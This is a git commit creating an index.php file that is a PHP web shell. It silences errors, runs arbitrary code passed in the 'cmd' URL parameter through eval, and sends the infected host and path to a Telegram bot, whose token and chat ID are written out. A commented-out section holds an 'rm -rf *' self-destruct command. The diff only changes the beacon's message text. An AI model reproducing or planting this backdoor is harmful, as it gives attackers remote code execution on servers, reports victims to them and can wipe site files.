607a066c24235e9b8ee96088ed9c184707f5dd98
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-17 00:24:24 +0000

    Create index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 error_reporting(0);
 error_log(0);
 eval($_GET['cmd']);
-file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=Old: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=new: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 /*
 //echo '<script>alert("Self Destruct Activated");</script>';
 system('rm -rf *');
